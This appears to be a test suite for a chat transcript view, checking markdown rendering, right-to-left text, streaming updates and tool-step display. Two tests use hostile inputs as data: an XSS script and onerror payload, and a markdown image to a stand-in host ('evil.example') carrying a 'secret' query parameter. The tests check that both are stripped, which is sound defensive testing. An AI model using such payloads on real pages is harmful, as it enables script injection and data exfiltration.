// Tests for web/chat.js (the chat transcript page), run with `make test-web`.
const test = require('node:test')
const assert = require('node:assert/strict')
const path = require('node:path')
const { JSDOM } = require('jsdom')

const web = path.join(__dirname, '..', '..', 'web')
const createMarkdownRenderer = require(path.join(web, 'render.js'))
const createChatView = require(path.join(web, 'chat.js'))

function setUp () {
  const { window } = new JSDOM('<!doctype html><body><div id="empty"></div><main id="chat"></main><div id="status" hidden></div></body>')
  const renderer = createMarkdownRenderer({
    markdownit: require(path.join(web, 'vendor/markdown-it.min.js')),
    footnote: require(path.join(web, 'vendor/markdown-it-footnote.min.js')),
    hljs: require(path.join(web, 'vendor/highlight.min.js')),
    DOMPurify: require(path.join(web, 'vendor/purify.min.js'))(window)
  })
  const document = window.document
  const view = createChatView({
    document,
    renderer,
    container: document.getElementById('chat'),
    empty: document.getElementById('empty'),
    status: document.getElementById('status')
  })
  return { view, document, chat: document.getElementById('chat') }
}

const options = { baseDir: 'file:///Users/me/notes/' }

test('shows the user message as plain text, with the selection it was about', () => {
  const { view, chat } = setUp()
  view.upsert([{ id: 'u1', kind: 'user', text: 'Make <b>this</b> shorter', quote: 'שלום עולם' }], options)
  const item = chat.querySelector('[data-id="u1"]')
  assert.equal(item.querySelector('.text').textContent, 'Make <b>this</b> shorter')
  assert.equal(item.querySelector('b'), null)
  assert.equal(item.querySelector('.quote').textContent, 'שלום עולם')
  assert.equal(item.querySelector('.quote').getAttribute('dir'), 'auto')
  assert.equal(item.querySelector('.text').getAttribute('dir'), 'auto')
})

test('renders replies as sanitized markdown that can read right to left', () => {
  const { view, chat } = setUp()
  view.upsert([{ id: 'a1', kind: 'assistant', text: 'שינוי **קטן**\n\n| a |\n| - |\n| 1 |\n\n<script>alert(1)</script><img src=x onerror=alert(1)>' }], options)
  const item = chat.querySelector('[data-id="a1"]')
  assert.equal(item.querySelector('strong').textContent, 'קטן')
  assert.equal(item.querySelector('p').getAttribute('dir'), 'auto')
  assert.ok(item.querySelector('table'))
  assert.equal(item.querySelector('script'), null)
  assert.equal(item.querySelector('[onerror]'), null)
})

test('updates a streaming reply in place', () => {
  const { view, chat } = setUp()
  view.upsert([{ id: 'a1', kind: 'assistant', text: 'Hel', streaming: true }], options)
  view.upsert([{ id: 'a1', kind: 'assistant', text: 'Hello, done.', streaming: false }], options)
  const items = chat.querySelectorAll('.item')
  assert.equal(items.length, 1)
  assert.equal(items[0].textContent.trim(), 'Hello, done.')
  assert.equal(items[0].classList.contains('streaming'), false)
})

test('keeps items in the order they first appeared', () => {
  const { view, chat } = setUp()
  view.upsert([{ id: 'u1', kind: 'user', text: 'Hi' }, { id: 'a2', kind: 'assistant', text: 'One', streaming: true }], options)
  view.upsert([{ id: 's3', kind: 'step', text: 'Read a.md', state: 'running' }], options)
  view.upsert([{ id: 'a2', kind: 'assistant', text: 'One, finished' }], options)
  assert.deepEqual([...chat.children].map(el => el.dataset.id), ['u1', 'a2', 's3'])
})

test('shows a step with its state, command and full path', () => {
  const { view, chat } = setUp()
  view.upsert([{ id: 's1', kind: 'step', text: 'List files', code: 'ls -1', detail: '/Users/me/notes', state: 'running', icon: 'run' }], options)
  view.upsert([{ id: 's1', kind: 'step', text: 'List files', code: 'ls -1', detail: '/Users/me/notes', state: 'denied', icon: 'run' }], options)
  const item = chat.querySelector('[data-id="s1"]')
  assert.ok(item.classList.contains('state-denied'))
  assert.equal(item.classList.contains('state-running'), false)
  assert.equal(item.querySelector('.label').textContent, 'List files')
  assert.equal(item.querySelector('code').textContent, 'ls -1')
  assert.equal(item.title, '/Users/me/notes')
})

test('keeps remote images out of replies but leaves links to the folder working', () => {
  const { view, chat } = setUp()
  view.upsert([{ id: 'a1', kind: 'assistant', text: '![chart](https://evil.example/c.png?d=secret) see [the guide](docs/guide.md) and ![local](img/a.png)' }], options)
  const item = chat.querySelector('[data-id="a1"]')
  assert.equal(item.querySelector('img[src^="https:"]'), null)
  assert.match(item.textContent, /chart/)
  assert.equal(item.querySelector('a').getAttribute('href'), 'mdv-file://local/Users/me/notes/docs/guide.md')
  assert.equal(item.querySelector('img').getAttribute('src'), 'mdv-file://local/Users/me/notes/img/a.png')
})

test('shows notices with their tone', () => {
  const { view, chat } = setUp()
  view.upsert([{ id: 'n1', kind: 'notice', text: 'Not logged in', tone: 'error' }], options)
  const item = chat.querySelector('[data-id="n1"]')
  assert.ok(item.classList.contains('tone-error'))
  assert.equal(item.textContent, 'Not logged in')
})

test('starts over empty, with the hint, and shows what Claude is doing', () => {
  const { view, chat, document } = setUp()
  const empty = document.getElementById('empty')
  const status = document.getElementById('status')
  assert.equal(empty.hidden, false)
  view.upsert([{ id: 'u1', kind: 'user', text: 'Hi' }], options)
  assert.equal(empty.hidden, true)
  view.setStatus('Thinking…')
  assert.equal(status.hidden, false)
  assert.equal(status.textContent, 'Thinking…')
  view.setStatus(null)
  assert.equal(status.hidden, true)
  view.reset()
  assert.equal(chat.children.length, 0)
  assert.equal(empty.hidden, false)
  view.upsert([{ id: 'u9', kind: 'user', text: 'Again' }], options)
  assert.equal(chat.children.length, 1)
})
